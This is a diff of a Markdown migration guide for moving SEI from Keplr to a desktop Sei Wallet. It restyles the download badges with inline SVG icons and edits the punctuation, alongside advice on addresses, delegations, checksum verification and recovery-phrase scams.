@@ -5,23 +5,27 @@
 <p align="center">Send from Keplr to the desktop app without losing track of the address form.</p>
 
 <p align="center">
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
   <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
 </p>
+
+<div align="center">
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-This is the rare migration that is not a rescue. Keplr is an established Cosmos wallet that has supported Sei for years, and it holds your key either way. Moving to a desktop Sei wallet is a preference — usually about staking, address handling or wanting the key outside a browser extension — and because nothing is on fire, you can do it slowly and check each step.
+Moving SEI from Keplr to Sei Wallet is a preference rather than a rescue: the coins stay on the same chain and change hands by transfer or by importing the same key. Keplr is an established Cosmos wallet that has supported Sei for years, and it holds your key either way. Moving to a desktop Sei wallet is a preference - usually about staking, address handling or wanting the key outside a browser extension - and because nothing is on fire, you can do it slowly and check each step.
 
 That is also the risk: a calm migration invites shortcuts. The three things that matter are which account you land on, which address form you are looking at, and whether a delegation survives the move.
 
@@ -39,7 +43,7 @@ Neither is wrong. If most of your activity is Cosmos-wide, Keplr's breadth is th
 
 **Does not carry over:** Keplr's chain list, its saved addresses, its connection permissions to dApps, and any custom settings. You are recreating an account in a new interface, not cloning an app.
 
-**Might look different:** the address you see first. If Keplr showed you the `sei1` form and the new wallet opens on the `0x` form, that is expected rather than alarming — provided the underlying account is the same one.
+**Might look different:** the address you see first. If Keplr showed you the `sei1` form and the new wallet opens on the `0x` form, that is expected rather than alarming - provided the underlying account is the same one.
 
 ## Step 1: record the account and the position
 
@@ -49,7 +53,7 @@ Open Keplr, select the Sei account, and write down:
 - whether any SEI is delegated, and to which validator;
 - whether the account is protected by a Ledger rather than a software key.
 
-That last item decides the whole procedure. A Ledger-backed account is not imported by typing anything — you connect the device. The details are in [pairing a hardware wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).
+That last item decides the whole procedure. A Ledger-backed account is not imported by typing anything - you connect the device. The details are in [pairing a hardware wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).
 
 ## Step 2: install, and verify what you installed
 
@@ -83,7 +87,7 @@ Leave a liquid balance for fees. Delegate the entire balance and the exit transa
 
 Two clients on one key will both work, and that is exactly the problem: the same account can be signed from two places, and it becomes unclear which one you approved something in. Pick one as primary, and treat the other as an export you can return to rather than a parallel account.
 
-If you keep Keplr installed for other Cosmos chains, that is fine — just stop using its Sei account for new activity once the new wallet is confirmed working.
+If you keep Keplr installed for other Cosmos chains, that is fine - just stop using its Sei account for new activity once the new wallet is confirmed working.
 
 ## What to do with the Keplr extension
 
@@ -91,11 +95,11 @@ Nothing drastic. Keplr is a legitimate maintained wallet; uninstalling it is a p
 
 ## Related migrations
 
-If you are consolidating from several places at once, the other routes are [leaving Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md), [the Leap migration](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md), [leaving Trust Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) and [pulling SEI off an exchange](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md).
+If you are consolidating from several places at once, the other routes are [leaving Compass for Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md), [migrating from Leap to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md), [leaving Trust Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) and [pulling SEI off an exchange](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md).
 
 ## Frequently asked questions
 
-**Is Keplr Wallet safe?** It is a long-established Cosmos wallet. No wallet removes every risk, and this article does not track its current maintenance status — check its own channels before relying on it.
+**Is Keplr Wallet safe?** It is a long-established Cosmos wallet. No wallet removes every risk, and this article does not track its current maintenance status - check its own channels before relying on it.
 
 **Is Keplr free?** Its documentation describes the wallet itself as free; you pay network fees on the chains you use.
 
@@ -109,11 +113,15 @@ If you are consolidating from several places at once, the other routes are [leav
 
 ## Download Sei Wallet
 
+<div align="center">
+
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
